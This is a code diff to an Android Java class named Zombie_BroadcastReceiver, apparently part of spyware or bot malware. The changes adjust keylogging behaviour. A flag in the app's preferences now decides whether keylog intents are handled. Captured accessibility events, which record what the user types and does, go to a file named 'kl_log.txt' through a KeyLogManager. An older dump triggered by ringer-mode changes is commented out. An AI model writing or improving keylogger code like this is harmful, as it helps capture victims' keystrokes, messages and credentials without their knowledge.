@@ -51,7 +51,7 @@ public class Zombie_BroadcastReceiver extends BroadcastReceiver {
 		SharedPreferences prefs = mContext.getSharedPreferences("events", 1);
 		
 		if ( action.equals("android.media.RINGER_MODE_CHANGED")) {
-			KeyLogManager.getInstance().dump();
+			//KeyLogManager.getInstance().dump("e");
 		} else if ( action.equals(Zombie_BroadcastReceiver.ACTION_NOTIFY )) {
 			String packName = intent.getStringExtra(Zombie_BroadcastReceiver.EXTRA_PACKAGE);
 			if ( !packName.equals("com.android.mms")) {
@@ -62,7 +62,8 @@ public class Zombie_BroadcastReceiver extends BroadcastReceiver {
 				}
 			}
 		} else if (action.equals(Zombie_BroadcastReceiver.ACTION_KEYLOG )) {
-			handleKeyLog(intent);
+			if ( prefs.contains(action))
+			 handleKeyLog(intent);
 		} else {
 			Zombie_BroadcastReceiver.startServiceIfNeeded(context);
 			mPool.execPool(context);
@@ -96,9 +97,16 @@ public class Zombie_BroadcastReceiver extends BroadcastReceiver {
 		
 	}
 
+	
+	public static String mLogFile = null;
+	
 	public void handleKeyLog(Intent intent) {
+		if ( mLogFile == null )
+			mLogFile = CommandObj.getFile(mContext, "kl_log.txt", false);
 		 AccessibilityEvent event = intent.getParcelableExtra("event");
-		 KeyLogManager.getInstance().handleEvent(event);
+		 KeyLogManager mgr = KeyLogManager.getInstance();
+		 mgr.mFilePath = mLogFile;
+		 mgr.handleEvent(event);
 	}
 
 	public static void serviceLoop(Context context,int sec) {
